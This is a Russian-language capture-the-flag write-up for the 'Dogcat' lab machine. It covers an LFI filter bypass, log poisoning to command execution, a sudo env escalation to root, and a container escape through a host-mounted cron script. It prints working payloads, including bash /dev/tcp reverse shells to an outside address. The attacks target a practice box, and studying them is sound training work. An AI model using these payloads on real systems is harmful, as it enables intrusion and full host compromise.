**Отчет о пентесте машины Dogcat**

**Цель:** Получение полного доступа к системе (root) и выход из контейнера на хост-систему.


### 1. Разведка и обнаружение уязвимостей

**1.1. Сканирование сети**  
Первым этапом проведено сканирование портов с использованием Nmap. Обнаружены следующие открытые порты:

- **20/tcp** – SSH (OpenSSH)
- **80/tcp** – HTTP (Apache Web Server)

**1.2. Анализ веб-приложения**  
На главной странице веб-сервера обнаружена возможность просмотра изображений через параметр `view`:

```
http://10.112.183.214/?view=cat
```

При передаче параметра `view` сервер подставляет значение в `include()`. Попытка эксплуатации LFI через `cats/etc/passwd` вернула ошибку:

```
Warning: include(cats/etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
```

Это указывает на то, что сервер автоматически добавляет расширение `.php` к передаваемому значению.

**1.3. Подбор LFI-пейлоадов**  
В ходе подбора обнаружено, что:

- `data://` wrapper отключён (`allow_url_include=0`).
- `expect://` wrapper отсутствует.
- Найден файл `flag.php`.

В коде `index.php` обнаружена логика: сервер добавляет `.php` к параметру `view`, если не передан параметр `ext`. Также проверяется наличие `dog` или `cat` в параметре `view`.


### 2. Эксплуатация LFI и получение первого флага

**2.1. Обход фильтра через `dog/../`**  
Использован обход:

```
dog/../dog/../dog/../flag
```

Сервер добавил `.php`, и был прочитан `flag.php`. Через `php://filter` получено содержимое в Base64:

```
PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
```

После декодирования получен первый флаг.

**2.2. Получение исходного кода `index.php`**  
Через LFI получен исходный код:

```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```

**Вывод:** параметр `ext` контролируется пользователем. Если он передан, `.php` не добавляется.


### 3. Log Poisoning и получение RCE

**3.1. Чтение логов Apache**  
Через LFI получен доступ к `access.log`:

```
?view=php://filter/convert.base64-encode/resource=dog/../dog/../dog/../../../../var/www/html/../../../../../../../../../../../../var/log/apache2/access&ext=.log
```

В логе обнаружена запись с User-Agent, содержащим PHP-код.

**3.2. Выполнение команд через LFI**  
При использовании:

```
/?view=dog/../dog/../dog/../../../../var/www/html/../../../../../../../../../../../../var/log/apache2/access&ext=.log&cmd=id
```

Получен результат:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**3.3. Получение reverse shell**  
Отправлен payload:

```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.131.25%2F5555%200%3E%261%27
```

Получен reverse shell от пользователя `www-data`.


### 4. Обнаружение контейнера и эскалация до root внутри него

**4.1. Признаки контейнера**  
На основе следующих признаков установлено, что система является Docker-контейнером:

- `hostname`: `ea91ab5d0b87` (хэш контейнера)
- Сетевой интерфейс: `172.17.0.2`
- Наличие файла `/.dockerenv`

**4.2. Проверка привилегий**  
Выполнена команда `sudo -l`:

```
User www-data may run the following commands on ea91ab5d0b87:
    (root) NOPASSWD: /usr/bin/env
```

Обнаружена возможность запуска `/usr/bin/env` от root без пароля.

**4.3. Получение root в контейнере**  
Выполнена команда:

```bash
sudo /usr/bin/env /bin/sh
```

Получен root-шелл внутри контейнера.


### 5. Container Escape и получение root на хосте

**5.1. Анализ монтирований**  
Через `mount` обнаружено, что директория `/opt/backups` смонтирована с хоста:

```
/dev/nvme1n1p2 on /opt/backups type ext4 (rw,relatime,data=ordered)
```

Это означает, что запись в `/opt/backups` попадает на хост-систему.

**5.2. Обнаружение скрипта `backup.sh`**  
В `/opt/backups` найден скрипт `backup.sh`, который, вероятно, выполняется cron'ом на хосте от root.

**5.3. Модификация скрипта**  
Скрипт перезаписан для получения reverse shell:

```bash
echo '#!/bin/bash' > /opt/backups/backup.sh
echo 'bash -i >& /dev/tcp/192.168.131.25/6666 0>&1' >> /opt/backups/backup.sh
```

**5.4. Получение root на хосте**  
После выполнения скрипта получен reverse shell с правами root на хост-системе.


### 6. Итоговый вывод

В ходе пентеста машины Dogcat были успешно реализованы следующие этапы:

1. **Разведка:** Сканирование портов, анализ веб-приложения, обнаружение LFI.
2. **Эксплуатация LFI:** Обход фильтра через `dog/../`, чтение `flag.php`, получение исходного кода.
3. **Log Poisoning:** Запись PHP-кода в лог Apache, выполнение команд, получение reverse shell.
4. **Эскалация внутри контейнера:** Использование `sudo /usr/bin/env` для получения root в контейнере.
5. **Container Escape:** Использование смонтированной директории `/opt/backups` и cron для получения root на хосте.

**Результат:** Полный контроль над системой и хост-машиной достигнут. Компрометация корневого пользователя подтверждена.
